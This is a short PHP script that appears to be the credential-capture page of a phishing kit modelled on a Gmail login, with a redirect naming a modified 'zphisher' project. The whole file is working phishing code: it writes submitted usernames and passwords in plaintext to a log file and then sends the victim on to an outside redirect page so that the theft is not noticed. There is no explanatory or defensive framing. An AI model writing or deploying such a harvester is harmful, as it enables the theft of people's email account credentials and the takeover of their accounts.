<?php

file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://kodk-fr.github.io/Modifed-zphisher/redirect.html');
exit();
?>